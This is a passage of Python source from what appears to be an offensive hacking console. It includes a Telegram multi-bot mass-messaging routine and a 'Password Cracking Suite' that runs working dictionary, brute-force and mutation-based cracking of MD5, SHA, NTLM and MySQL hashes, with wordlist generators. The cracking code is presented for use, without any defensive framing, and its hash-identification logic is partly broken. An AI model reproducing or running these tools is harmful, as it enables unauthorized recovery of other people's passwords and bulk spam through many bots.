        selected_bots = []
        if selection.lower() == 'all':
            selected_bots = bots
        else:
            indices = [int(idx.strip()) for idx in selection.split(",") if idx.strip().isdigit()]
            for idx in indices:
                if 1 <= idx <= len(bots):
                    selected_bots.append(bots[idx-1])
        
        if not selected_bots:
            print(Fore.RED + "[✗] No bots selected")
            return
        
        chat_ids = input(Fore.CYAN + "[→] Chat IDs (comma separated): " + Fore.WHITE).split(",")
        message = input(Fore.CYAN + "[→] Message: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Sending to {len(chat_ids)} chats using {len(selected_bots)} bots...")
        
        def send_from_bot(bot_token, chat_id, msg):
            try:
                bot = telebot.TeleBot(bot_token)
                bot.send_message(chat_id, msg)
                return True
            except:
                return False
        
        successful = 0
        total_attempts = len(selected_bots) * len(chat_ids)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for bot_alias, bot_token in selected_bots:
                for chat_id in chat_ids:
                    futures.append(executor.submit(send_from_bot, bot_token, chat_id, message))
            
            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    successful += 1
        
        print(Fore.GREEN + f"\n[✓] Mass sending completed!")
        print(Fore.CYAN + f"[+] Successful: {successful}/{total_attempts}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def bot_information(self):
        print(Fore.YELLOW + "\n[!] BOT INFORMATION")
        
        bots = self.db.get_bot_tokens()
        if not bots:
            print(Fore.RED + "[✗] No bots available")
            return
        
        for alias, token in bots:
            print(Fore.CYAN + f"\n[+] Bot: {alias}")
            print(Fore.YELLOW + "─" * 40)
            
            try:
                bot = telebot.TeleBot(token)
                bot_info = bot.get_me()
                
                print(Fore.WHITE + f"ID: {bot_info.id}")
                print(Fore.WHITE + f"Username: @{bot_info.username}")
                print(Fore.WHITE + f"Name: {bot_info.first_name}")
                print(Fore.WHITE + f"Token (first 20): {token[:20]}...")
                
                try:
                    updates = bot.get_updates(limit=1)
                    if updates:
                        print(Fore.WHITE + f"Last activity: {len(updates)} updates pending")
                except:
                    pass
                
                print(Fore.GREEN + "Status: Online")
                
            except Exception as e:
                print(Fore.RED + f"Status: Offline - {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def delete_bot(self):
        print(Fore.YELLOW + "\n[!] DELETE BOT")
        
        bots = self.db.get_bot_tokens()
        if not bots:
            print(Fore.RED + "[✗] No bots available")
            return
        
        print(Fore.CYAN + "[→] Select bot to delete:")
        for i, (alias, _) in enumerate(bots, 1):
            print(Fore.WHITE + f"  {i}. {alias}")
        
        choice = input(Fore.CYAN + "\n[→] Selection: " + Fore.WHITE)
        
        if choice.isdigit() and 1 <= int(choice) <= len(bots):
            alias, _ = bots[int(choice)-1]
            
            confirm = input(Fore.RED + f"[!] Confirm delete bot '{alias}'? (y/n): " + Fore.WHITE).lower()
            
            if confirm == 'y':
                self.db.delete_bot_token(alias)
                print(Fore.GREEN + f"[✓] Bot '{alias}' deleted")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")

# ============================================
# PASSWORD CRACKING SUITE (COMPLETE)
# ============================================
class PasswordCrackingSuite:
    def __init__(self, db):
        self.db = db
        self.wordlists = {}
        self.load_wordlists()
        self.hash_types = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512,
            'ntlm': self.ntlm_hash,
            'mysql': self.mysql_hash,
        }
    
    def load_wordlists(self):
        print(Fore.YELLOW + "[!] Loading wordlists...")
        
        default_wordlists = {
            'rockyou': 'Common passwords (14M entries)',
            'top1000': 'Top 1000 passwords',
            'top10000': 'Top 10000 passwords',
            'names': 'Common names',
            'dates': 'Dates and years',
            'custom': 'Custom wordlist'
        }
        
        self.wordlists = default_wordlists
        
        # Try to load actual wordlist files
        wordlist_paths = [
            '/usr/share/wordlists/rockyou.txt',
            'wordlists/rockyou.txt',
            'rockyou.txt'
        ]
        
        for path in wordlist_paths:
            if os.path.exists(path):
                try:
                    with open(path, 'r', encoding='latin-1') as f:
                        count = sum(1 for _ in f)
                    self.wordlists['rockyou'] = f'Common passwords ({count:,} entries)'
                    break
                except:
                    pass
        
        print(Fore.GREEN + f"[✓] Loaded {len(self.wordlists)} wordlists")
    
    def ntlm_hash(self, password):
        import hashlib
        return hashlib.new('md4', password.encode('utf-16le')).hexdigest()
    
    def mysql_hash(self, password):
        import hashlib
        hash1 = hashlib.sha1(password.encode()).digest()
        hash2 = hashlib.sha1(hash1).hexdigest()
        return f"*{hash2.upper()}"
    
    def display_menu(self):
        clear_screen()
        ascii_crack = """
        ╔══════════════════════════════════════════════════════════╗
        ║               PASSWORD CRACKING SUITE                    ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.RED + ascii_crack)
        
        print(Fore.YELLOW + "═" * 70)
        print(Fore.CYAN + "1. Dictionary Attack")
        print(Fore.CYAN + "2. Brute Force Attack")
        print(Fore.CYAN + "3. Hybrid Attack")
        print(Fore.CYAN + "4. Rainbow Table Attack")
        print(Fore.CYAN + "5. Rule-Based Attack")
        print(Fore.CYAN + "6. Password Analysis")
        print(Fore.CYAN + "7. Hash Identifier")
        print(Fore.CYAN + "8. Wordlist Manager")
        print(Fore.CYAN + "9. Password Generator")
        print(Fore.CYAN + "10. Hash Cracking History")
        print(Fore.CYAN + "11. Online Hash Lookup")
        print(Fore.CYAN + "12. Password Strength Checker")
        print(Fore.CYAN + "13. Back to Main Menu")
        print(Fore.YELLOW + "═" * 70)
    
    def dictionary_attack(self):
        print(Fore.YELLOW + "\n[!] DICTIONARY ATTACK")
        
        target_hash = input(Fore.CYAN + "[→] Target hash: " + Fore.WHITE)
        hash_type = self.identify_hash(target_hash)
        
        if not hash_type:
            hash_type = input(Fore.CYAN + "[→] Hash type (md5/sha1/sha256/sha512/ntlm): " + Fore.WHITE).lower()
        
        print(Fore.GREEN + f"\n[+] Identified hash type: {hash_type}")
        
        print(Fore.CYAN + "\n[+] Available wordlists:")
        for i, (name, desc) in enumerate(self.wordlists.items(), 1):
            print(Fore.WHITE + f"  {i}. {name}: {desc}")
        
        wl_choice = input(Fore.CYAN + "\n[→] Select wordlist: " + Fore.WHITE)
        
        if wl_choice.isdigit() and 1 <= int(wl_choice) <= len(self.wordlists):
            wl_name = list(self.wordlists.keys())[int(wl_choice)-1]
            
            print(Fore.YELLOW + f"\n[!] Starting dictionary attack with {wl_name}...")
            
            # Load wordlist
            words = self.load_wordlist_file(wl_name)
            
            if not words:
                print(Fore.RED + "[✗] Wordlist not available, using default")
                words = self.get_default_wordlist()
            
            print(Fore.CYAN + f"[+] Words to try: {len(words):,}")
            print(Fore.YELLOW + "[!] Cracking in progress...\n")
            
            found = False
            start_time = time.time()
            
            for i, word in enumerate(words, 1):
                test_hash = self.calculate_hash(word, hash_type)
                
                if i % 1000 == 0:
                    progress = (i / len(words)) * 100
                    elapsed = time.time() - start_time
                    speed = i / elapsed if elapsed > 0 else 0
                    print(Fore.YELLOW + f"[!] Progress: {progress:.1f}% | Tried: {i:,} | Speed: {speed:.0f} hashes/sec", end='\r')
                
                if test_hash.lower() == target_hash.lower():
                    elapsed = time.time() - start_time
                    print(Fore.GREEN + f"\n\n[✓] PASSWORD CRACKED!")
                    print(Fore.CYAN + f"[+] Password: {word}")
                    print(Fore.CYAN + f"[+] Hash: {target_hash}")
                    print(Fore.CYAN + f"[+] Time: {elapsed:.2f} seconds")
                    print(Fore.CYAN + f"[+] Attempts: {i:,}")
                    print(Fore.CYAN + f"[+] Speed: {i/elapsed:.0f} hashes/sec")
                    
                    self.db.add_password(target_hash, word, hash_type)
                    found = True
                    break
            
            if not found:
                elapsed = time.time() - start_time
                print(Fore.RED + f"\n\n[✗] Password not found in wordlist")
                print(Fore.CYAN + f"[+] Tried: {len(words):,} passwords")
                print(Fore.CYAN + f"[+] Time: {elapsed:.2f} seconds")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def identify_hash(self, hash_str):
        hash_len = len(hash_str)
        
        if hash_len == 32:
            return 'md5'
        elif hash_len == 40:
            return 'sha1'
        elif hash_len == 64:
            return 'sha256'
        elif hash_len == 128:
            return 'sha512'
        elif hash_len == 65 and hash_str.startswith('*'):
            return 'mysql'
        elif hash_len == 32 and all(c in '0123456789ABCDEFabcdef' for c in hash_str):
            return 'ntlm'
        
        return None
    
    def calculate_hash(self, password, hash_type):
        if hash_type in self.hash_types:
            if hash_type == 'ntlm':
                return self.hash_types[hash_type](password)
            elif hash_type == 'mysql':
                return self.hash_types[hash_type](password)
            else:
                return self.hash_types[hash_type](password.encode()).hexdigest()
        
        # Default to md5 if unknown
        return hashlib.md5(password.encode()).hexdigest()
    
    def load_wordlist_file(self, wl_name):
        words = []
        
        # Try to load actual file
        if wl_name == 'rockyou':
            paths = [
                '/usr/share/wordlists/rockyou.txt',
                'wordlists/rockyou.txt',
                'rockyou.txt'
            ]
            
            for path in paths:
                if os.path.exists(path):
                    try:
                        with open(path, 'r', encoding='latin-1') as f:
                            words = [line.strip() for line in f if line.strip()]
                        return words[:10000]  # Limit for demo
                    except:
                        pass
        
        # Default wordlists
        if wl_name == 'top1000':
            words = self.get_top_passwords(1000)
        elif wl_name == 'top10000':
            words = self.get_top_passwords(10000)
        elif wl_name == 'names':
            words = self.get_common_names()
        elif wl_name == 'dates':
            words = self.get_date_passwords()
        elif wl_name == 'custom':
            custom_file = input(Fore.CYAN + "[→] Custom wordlist file: " + Fore.WHITE)
            if os.path.exists(custom_file):
                try:
                    with open(custom_file, 'r') as f:
                        words = [line.strip() for line in f if line.strip()]
                except:
                    print(Fore.RED + "[✗] Failed to load custom wordlist")
        
        return words
    
    def get_top_passwords(self, count):
        top_passwords = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "abc123", "football", "monkey",
            "letmein", "696969", "shadow", "master", "666666",
            "qwertyuiop", "123321", "mustang", "1234567890", "michael",
            "654321", "superman", "1qaz2wsx", "7777777", "121212",
            "000000", "qazwsx", "123qwe", "killer", "trustno1",
            "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
            "buster", "soccer", "harley", "batman", "andrew",
            "tigger", "sunshine", "iloveyou", "2000", "charlie",
            "robert", "thomas", "hockey", "ranger", "daniel",
            "starwars", "klaster", "112233", "george", "computer",
            "michelle", "jessica", "pepper", "1111", "zxcvbn",
            "555555", "11111111", "131313", "freedom", "777777",
            "pass", "maggie", "159753", "aaaaaa", "ginger",
            "princess", "joshua", "cheese", "amanda", "summer",
            "love", "ashley", "nicole", "chelsea", "biteme",
            "matthew", "access", "yankees", "987654321", "dallas",
            "austin", "thunder", "taylor", "matrix", "mobilemail",
            "mom", "monitor", "monitoring", "montana", "moon",
            "moscow"
        ]
        
        return top_passwords[:count] if count <= len(top_passwords) else top_passwords
    
    def get_common_names(self):
        return [
            "john", "jane", "michael", "sarah", "david", "lisa",
            "robert", "mary", "william", "jennifer", "richard", "susan",
            "joseph", "karen", "thomas", "nancy", "charles", "betty",
            "christopher", "sandra", "daniel", "margaret", "matthew", "ashley",
            "anthony", "dorothy", "donald", "rebecca", "mark", "sharon",
            "paul", "cynthia", "steven", "kathleen", "andrew", "amy",
            "kenneth", "shirley", "joshua", "emily", "kevin", "anna",
            "brian", "ruth", "george", "angela", "timothy", "virginia",
            "ronald", "brenda", "edward", "pamela", "jason", "carol",
            "jeffrey", "christine", "ryan", "marie", "jacob", "janet",
            "gary", "catherine", "nicholas", "frances", "eric", "ann",
            "jonathan", "joyce", "stephen", "diane", "larry", "alice",
            "justin", "julie", "scott", "heather", "brandon", "teresa",
            "benjamin", "doris", "samuel", "gloria", "frank", "evelyn",
            "gregory", "jean", "raymond", "cheryl", "alexander", "martha",
            "patrick", "megan", "jack", "lauren", "dennis", "holly",
            "jerry", "amber", "tyler", "denise", "aaron", "danielle",
            "jose", "rachel", "adam", "maria", "henry", "katie",
            "nathan", "linda", "douglas", "jessica", "zachary", "tammy",
            "peter", "christina", "kyle", "barbara", "walter", "nicole",
            "ethan", "shannon", "jeremy", "monica", "harold", "laura",
            "keith", "paula", "christian", "crystal", "roger", "kelly",
            "terry", "norma", "sean", "shelly", "arthur", "judy",
            "austin", "theresa", "noah", "beverly", "lawrence", "diana",
            "jesse", "bridget", "joe", "olivia", "bryan", "robin",
            "billy", "peggy", "jordan", "carla", "albert", "cathy",
            "dylan", "joan", "bruce", "sue", "willie", "sherry",
            "gabe", "tracy", "alan", "ellen", "juan", "edith",
            "logan", "carrie", "wayne", "juana", "ralph", "sara",
            "roy", "rita", "eugene", "rosemary", "randy", "darlene",
            "vincent", "cindy", "russell", "milissa", "louis", "angel",
            "philip", "janice", "bobby", "leigh", "johnny", "erin",
            "carl", "leslie", "edwin", "courtney", "julian", "cassandra"
        ]
    
    def get_date_passwords(self):
        passwords = []
        
        # Years
        for year in range(1900, 2025):
            passwords.append(str(year))
        
        # Common date formats
        for month in range(1, 13):
            for day in range(1, 32):
                passwords.append(f"{month:02d}{day:02d}")
                passwords.append(f"{day:02d}{month:02d}")
                passwords.append(f"{month}{day}")
                passwords.append(f"{day}{month}")
        
        # With years
        for year in [1990, 1991, 1992, 1993, 1994, 1995, 1996, 1997, 1998, 1999,
                     2000, 2001, 2002, 2003, 2004, 2005, 2006, 2007, 2008, 2009,
                     2010, 2011, 2012, 2013, 2014, 2015, 2016, 2017, 2018, 2019,
                     2020, 2021, 2022, 2023]:
            for month in range(1, 13):
                for day in range(1, 32):
                    passwords.append(f"{month:02d}{day:02d}{year}")
                    passwords.append(f"{day:02d}{month:02d}{year}")
        
        return passwords
    
    def get_default_wordlist(self):
        return self.get_top_passwords(10000)
    
    def brute_force_attack(self):
        print(Fore.YELLOW + "\n[!] BRUTE FORCE ATTACK")
        
        target_hash = input(Fore.CYAN + "[→] Target hash: " + Fore.WHITE)
        hash_type = input(Fore.CYAN + "[→] Hash type: " + Fore.WHITE).lower()
        min_len = int(input(Fore.CYAN + "[→] Minimum password length: " + Fore.WHITE))
        max_len = int(input(Fore.CYAN + "[→] Maximum password length: " + Fore.WHITE))
        
        charset = input(Fore.CYAN + "[→] Character set (l=lower, u=upper, d=digit, s=special): " + Fore.WHITE)
        
        characters = ""
        if 'l' in charset:
            characters += string.ascii_lowercase
        if 'u' in charset:
            characters += string.ascii_uppercase
        if 'd' in charset:
            characters += string.digits
        if 's' in charset:
            characters += "!@#$%^&*()_+-=[]{}|;:,.<>?"
        
        if not characters:
            characters = string.ascii_lowercase + string.digits
        
        print(Fore.YELLOW + f"\n[!] Starting brute force attack...")
        print(Fore.CYAN + f"[+] Character set: {len(characters)} characters")
        print(Fore.CYAN + f"[+] Password length: {min_len}-{max_len}")
        
        total_combinations = sum(len(characters) ** i for i in range(min_len, max_len + 1))
        print(Fore.CYAN + f"[+] Total combinations: {total_combinations:,}")
        
        if total_combinations > 100000000:
            print(Fore.RED + "[!] WARNING: This will take a VERY long time!")
            confirm = input(Fore.CYAN + "[→] Continue? (y/n): " + Fore.WHITE).lower()
            if confirm != 'y':
                return
        
        print(Fore.YELLOW + "\n[!] Cracking in progress...")
        
        found = False
        attempts = 0
        start_time = time.time()
        
        for length in range(min_len, max_len + 1):
            if found:
                break
            
            # Generate combinations for this length
            for combo in itertools.product(characters, repeat=length):
                if found:
                    break
                
                password = ''.join(combo)
                attempts += 1
                
                test_hash = self.calculate_hash(password, hash_type)
                
                if attempts % 1000 == 0:
                    elapsed = time.time() - start_time
                    speed = attempts / elapsed if elapsed > 0 else 0
                    eta = (total_combinations - attempts) / speed if speed > 0 else 0
                    
                    print(Fore.YELLOW + f"[!] Tried: {attempts:,} | Speed: {speed:.0f}/sec | ETA: {eta/3600:.1f}h", end='\r')
                
                if test_hash.lower() == target_hash.lower():
                    elapsed = time.time() - start_time
                    print(Fore.GREEN + f"\n\n[✓] PASSWORD CRACKED!")
                    print(Fore.CYAN + f"[+] Password: {password}")
                    print(Fore.CYAN + f"[+] Length: {length}")
                    print(Fore.CYAN + f"[+] Time: {elapsed:.2f} seconds")
                    print(Fore.CYAN + f"[+] Attempts: {attempts:,}")
                    print(Fore.CYAN + f"[+] Speed: {attempts/elapsed:.0f} hashes/sec")
                    
                    self.db.add_password(target_hash, password, hash_type)
                    found = True
                    break
        
        if not found:
            elapsed = time.time() - start_time
            print(Fore.RED + f"\n\n[✗] Password not found")
            print(Fore.CYAN + f"[+] Tried: {attempts:,} combinations")
            print(Fore.CYAN + f"[+] Time: {elapsed:.2f} seconds")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def hybrid_attack(self):
        print(Fore.YELLOW + "\n[!] HYBRID ATTACK")
        print(Fore.GREEN + "[+] Combines dictionary words with mutations")
        
        target_hash = input(Fore.CYAN + "[→] Target hash: " + Fore.WHITE)
        hash_type = input(Fore.CYAN + "[→] Hash type: " + Fore.WHITE).lower()
        
        print(Fore.CYAN + "\n[+] Mutation rules:")
        print(Fore.WHITE + "  1. Add numbers to end (123, 1, 123456)")
        print(Fore.WHITE + "  2. Add special characters (!@#$)")
        print(Fore.WHITE + "  3. Capitalize letters")
        print(Fore.WHITE + "  4. Leet speak (a->@, e->3, etc)")
        print(Fore.WHITE + "  5. Reverse words")
        print(Fore.WHITE + "  6. All combinations")
        
        rule_choice = input(Fore.CYAN + "\n[→] Select rules (comma separated): " + Fore.WHITE)
        
        base_words = self.get_default_wordlist()[:1000]
        
        print(Fore.YELLOW + f"\n[!] Starting hybrid attack with {len(base_words)} base words...")
        
        mutations = []
        rules = [r.strip() for r in rule_choice.split(",")]
        
        for word in base_words:
            mutations.append(word)  # Original
            
            if '1' in rules:
                mutations.append(word + "123")
                mutations.append(word + "1")
                mutations.append(word + "123456")
                mutations.append(word + "2023")
            
            if '2' in rules:
                mutations.append(word + "!")
                mutations.append(word + "@")
                mutations.append(word + "#")
                mutations.append(word + "$")
                mutations.append(word + "!@#$")
            
            if '3' in rules:
                mutations.append(word.capitalize())
                mutations.append(word.upper())
            
            if '4' in rules:
                leet_word = word
                leet_word = leet_word.replace('a', '@')
                leet_word = leet_word.replace('e', '3')
                leet_word = leet_word.replace('i', '1')
                leet_word = leet_word.replace('o', '0')
                leet_word = leet_word.replace('s', '$')
                mutations.append(leet_word)
            
            if '5' in rules:
                mutations.append(word[::-1])
        
        mutations = list(set(mutations))  # Remove duplicates
        
        print(Fore.CYAN + f"[+] Total mutations: {len(mutations):,}")
        print(Fore.YELLOW + "[!] Cracking in progress...\n")
        
        found = False
        attempts = 0
        start_time = time.time()
        
        for password in mutations:
            attempts += 1
            test_hash = self.calculate_hash(password, hash_type)
            
            if attempts % 1000 == 0:
                progress = (attempts / len(mutations)) * 100
                elapsed = time.time() - start_time
                print(Fore.YELLOW + f"[!] Progress: {progress:.1f}% | Tried: {attempts:,}", end='\r')
            
            if test_hash.lower() == target_hash.lower():
                elapsed = time.time() - start_time
                print(Fore.GREEN + f"\n\n[✓] PASSWORD CRACKED!")
                print(Fore.CYAN + f"[+] Password: {password}")
                print(Fore.CYAN + f"[+] Time: {elapsed:.2f} seconds")
                print(Fore.CYAN + f"[+] Attempts: {attempts:,}")
                
                self.db.add_password(target_hash, password, hash_type)
                found = True
                break
        
        if not found:
            elapsed = time.time() - start_time
            print(Fore.RED + f"\n\n[✗] Password not found")
            print(Fore.CYAN + f"[+] Tried: {attempts:,} mutations")
            print(Fore.CYAN + f"[+] Time: {elapsed:.2f} seconds")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def rainbow_table_attack(self):
        print(Fore.YELLOW + "\n[!] RAINBOW TABLE ATTACK")
        print(Fore.GREEN + "[+] Using pre-computed hash tables")
        
        target_hash = input(Fore.CYAN + "[→] Target hash: " + Fore.WHITE)
        
        print(Fore.YELLOW + "\n[!] Checking local rainbow tables...")
        
        # Check if hash exists in database
        plaintext = self.db.get_password_by_hash(target_hash)
        
        if plaintext:
            print(Fore.GREEN + f"\n[✓] PASSWORD FOUND IN DATABASE!")
            print(Fore.CYAN + f"[+] Password: {plaintext}")
            print(Fore.CYAN + f"[+] Source: Local rainbow table")
        else:
            print(Fore.RED + "[✗] Hash not found in local tables")
            print(Fore.YELLOW + "[!] Try online lookup or other methods")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def rule_based_attack(self):
        print(Fore.YELLOW + "\n[!] RULE-BASED ATTACK")
        print(Fore.GREEN + "[+] Apply transformation rules to wordlist")
        
        print(Fore.CYAN + "\n[+] Available rule sets:")
        print(Fore.WHITE + "  1. Common substitutions (a->@, e->3)")
        print(Fore.WHITE + "  2. Append numbers (0-9999)")
        print(Fore.WHITE + "  3. Prepend numbers (0-9999)")
        print(Fore.WHITE + "  4. Toggle case")
        print(Fore.WHITE + "  5. Duplicate words")
        print(Fore.WHITE + "  6. Custom rules")
        
        choice = input(Fore.CYAN + "\n[→] Select rule set: " + Fore.WHITE)
        
        print(Fore.GREEN + "[+] Rule-based attack configured")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def password_analysis(self):
        print(Fore.YELLOW + "\n[!] PASSWORD ANALYSIS")
        
        password = input(Fore.CYAN + "[→] Password to analyze: " + Fore.WHITE)
        
        print(Fore.GREEN + "\n[+] Password Analysis:")
        print(Fore.CYAN + "═" * 50)
        
        length = len(password)
        print(Fore.WHITE + f"Length: {length} characters")
        
        has_lower = any(c.islower() for c in password)
        has_upper = any(c.isupper() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(not c.isalnum() for c in password)
        
        print(Fore.WHITE + f"Contains lowercase: {'Yes' if has_lower else 'No'}")
        print(Fore.WHITE + f"Contains uppercase: {'Yes' if has_upper else 'No'}")
        print(Fore.WHITE + f"Contains digits: {'Yes' if has_digit else 'No'}")
        print(Fore.WHITE + f"Contains special: {'Yes' if has_special else 'No'}")
        
        # Common patterns
        common_patterns = [
            "123", "abc", "qwe", "password", "admin", "welcome",
            "qwerty", "letmein", "monkey", "dragon", "baseball",
            "football", "master", "hello", "superman", "iloveyou"
        ]
        
        patterns_found = []
        for pattern in common_patterns:
            if pattern in password.lower():
                patterns_found.append(pattern)
        
        if patterns_found:
            print(Fore.RED + f"Common patterns: {', '.join(patterns_found)}")
        else:
            print(Fore.GREEN + "No common patterns found")
        
        # Entropy calculation
        char_set_size = 0
        if has_lower:
            char_set_size += 26
        if has_upper:
            char_set_size += 26
        if has_digit:
            char_set_size += 10
        if has_special:
            char_set_size += 33
        
        if char_set_size > 0:
            entropy = length * (math.log(char_set_size) / math.log(2))
            print(Fore.WHITE + f"Entropy: {entropy:.2f} bits")
            
            if entropy < 40:
                print(Fore.RED + "Strength: Very Weak")
            elif entropy < 60:
                print(Fore.YELLOW + "Strength: Weak")
            elif entropy < 80:
                print(Fore.CYAN + "Strength: Moderate")
            elif entropy < 100:
                print(Fore.GREEN + "Strength: Strong")
            else:
                print(Fore.GREEN + "Strength: Very Strong")
        
        # Hash examples
        print(Fore.CYAN + "\n[+] Hash Examples:")
        print(Fore.WHITE + f"MD5: {hashlib.md5(password.encode()).hexdigest()}")
        print(Fore.WHITE + f"SHA1: {hashlib.sha1(password.encode()).hexdigest()}")
        print(Fore.WHITE + f"SHA256: {hashlib.sha256(password.encode()).hexdigest()}")
        
        print(Fore.CYAN + "═" * 50)
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def hash_identifier(self):
        print(Fore.YELLOW + "\n[!] HASH IDENTIFIER")
        
        hash_input = input(Fore.CYAN + "[→] Enter hash: " + Fore.WHITE)
        
        hash_len = len(hash_input)
        
        print(Fore.GREEN + "\n[+] Hash Analysis:")
        print(Fore.CYAN + "═" * 50)
        print(Fore.WHITE + f"Length: {hash_len} characters")
        print(Fore.WHITE + f"Hex only: {all(c in '0123456789ABCDEFabcdef' for c in hash_input)}")
        
        common_hashes = {
            32: "MD5, NTLM",
            40: "SHA-1",
            56: "SHA-224",
            64: "SHA-256",
            96: "SHA-384",
            128: "SHA-512",
            64: "Whirlpool",
            40: "RIPEMD-160",
            48: "Tiger/192",
            32: "LM Hash",
        }
        
        if hash_len in common_hashes:
            print(Fore.GREEN + f"Possible hash types: {common_hashes[hash_len]}")
        else:
            print(Fore.YELLOW + f"Uncommon hash length: {hash_len}")
        
        # Check for specific patterns
        if hash_input.startswith('$1$'):
            print(Fore.WHITE + "MD5 Crypt (Unix)")
        elif hash_input.startswith('$2a$') or hash_input.startswith('$2b$'):
            print(Fore.WHITE + "bcrypt")
        elif hash_input.startswith('$5$'):
            print(Fore.WHITE + "SHA-256 Crypt (Unix)")
        elif hash_input.startswith('$6$'):
            print(Fore.WHITE + "SHA-512 Crypt (Unix)")
        elif hash_input.startswith('*'):
            print(Fore.WHITE + "MySQL 4.1+ (SHA1 of SHA1)")
        
        print(Fore.CYAN + "═" * 50)
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def wordlist_manager(self):
        print(Fore.YELLOW + "\n[!] WORDLIST MANAGER")
        
        print(Fore.CYAN + "\n[+] Current wordlists:")
        for name, desc in self.wordlists.items():
            print(Fore.WHITE + f"  • {name}: {desc}")
        
        print(Fore.CYAN + "\n[+] Options:")
        print(Fore.WHITE + "  1. Add custom wordlist")
        print(Fore.WHITE + "  2. Generate wordlist")
        print(Fore.WHITE + "  3. Combine wordlists")
        print(Fore.WHITE + "  4. Clean wordlist")
        
        choice = input(Fore.CYAN + "\n[→] Select option: " + Fore.WHITE)
        
        if choice == "1":
            filepath = input(Fore.CYAN + "[→] Wordlist file: " + Fore.WHITE)
            name = input(Fore.CYAN + "[→] Wordlist name: " + Fore.WHITE)
            
            if os.path.exists(filepath):
                try:
                    with open(filepath, 'r') as f:
                        count = sum(1 for _ in f)
                    self.wordlists[name] = f"Custom ({count:,} entries)"
                    print(Fore.GREEN + f"[✓] Added {name} with {count:,} entries")
                except:
                    print(Fore.RED + "[✗] Failed to read wordlist")
            else:
                print(Fore.RED + "[✗] File not found")
        
        elif choice == "2":
            self.generate_wordlist()
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def generate_wordlist(self):
        print(Fore.YELLOW + "\n[!] GENERATE WORDLIST")
        
        output_file = input(Fore.CYAN + "[→] Output filename: " + Fore.WHITE)
        
        print(Fore.CYAN + "\n[+] Generation options:")
        print(Fore.WHITE + "  1. Common passwords")
        print(Fore.WHITE + "  2. Dates and years")
        print(Fore.WHITE + "  3. Names and surnames")
        print(Fore.WHITE + "  4. Custom pattern")
        
        choice = input(Fore.CYAN + "\n[→] Select option: " + Fore.WHITE)
        
        words = []
        
        if choice == "1":
            count = int(input(Fore.CYAN + "[→] Number of passwords (max 10000): " + Fore.WHITE))
            words = self.get_top_passwords(min(count, 10000))
        
        elif choice == "2":
            start_year = int(input(Fore.CYAN + "[→] Start year: " + Fore.WHITE))
            end_year = int(input(Fore.CYAN + "[→] End year: " + Fore.WHITE))
            
            for year in range(start_year, end_year + 1):
                words.append(str(year))
                for month in range(1, 13):
                    for day in range(1, 32):
                        words.append(f"{day:02d}{month:02d}{year}")
                        words.append(f"{month:02d}{day:02d}{year}")
        
        elif choice == "3":
            names = self.get_common_names()
            surnames = ["smith", "johnson", "williams", "jones", "brown",
                       "davis", "miller", "wilson", "moore", "taylor"]
            
            for name in names:
                words.append(name)
                for surname in surnames:
                    words.append(f"{name}{surname}")
                    words.append(f"{name.capitalize()}{surname.capitalize()}")
        
        elif choice == "4":
            pattern = input(Fore.CYAN + "[→] Pattern (use ? for character): " + Fore.WHITE)
            charset = input(Fore.CYAN + "[→] Character set: " + Fore.WHITE)
            
            # Simple pattern generation
            import itertools
            positions = pattern.count('?')
            combos = itertools.product(charset, repeat=positions)
            
            for combo in combos:
                word = pattern
                for char in combo:
                    word = word.replace('?', char, 1)
                words.append(word)
        
        if words:
            with open(output_file, 'w') as f:
                for word in set(words):  # Remove duplicates
                    f.write(word + "\n")
            
            print(Fore.GREEN + f"[✓] Generated {len(set(words)):,} words")
            print(Fore.GREEN + f"[✓] Saved to {output_file}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def password_generator(self):
        print(Fore.YELLOW + "\n[!] PASSWORD GENERATOR")
        
        count = int(input(Fore.CYAN + "[→] Number of passwords: " + Fore.WHITE))
        length = int(input(Fore.CYAN + "[→] Password length: " + Fore.WHITE))
        
        print(Fore.CYAN + "\n[+] Character sets:")
        print(Fore.WHITE + "  1. Lowercase letters")
        print(Fore.WHITE + "  2. Uppercase letters")
        print(Fore.WHITE + "  3. Digits")
        print(Fore.WHITE + "  4. Special characters")
        print(Fore.WHITE + "  5. All of the above")
        
        choice = input(Fore.CYAN + "\n[→] Select character sets (comma separated): " + Fore.WHITE)
        
        charset = ""
        if '1' in choice:
            charset += string.ascii_lowercase
        if '2' in choice:
            charset += string.ascii_uppercase
        if '3' in choice:
            charset += string.digits
        if '4' in choice:
            charset += "!@#$%^&*()_+-=[]{}|;:,.<>?"
        if '5' in choice:
            charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
        
        if not charset:
            charset = string.ascii_letters + string.digits
        
        print(Fore.GREEN + f"\n[+] Generating {count} passwords...")
        print(Fore.CYAN + "═" * 60)
        
        passwords = []
        for i in range(count):
            password = ''.join(random.choice(charset) for _ in range(length))
            passwords.append(password)
            print(Fore.WHITE + f"{i+1:3d}. {password}")
        
        print(Fore.CYAN + "═" * 60)
        
        save = input(Fore.CYAN + "\n[→] Save to file? (y/n): " + Fore.WHITE).lower()
        if save == 'y':
            filename = f"passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                for pwd in passwords:
                    f.write(pwd + "\n")
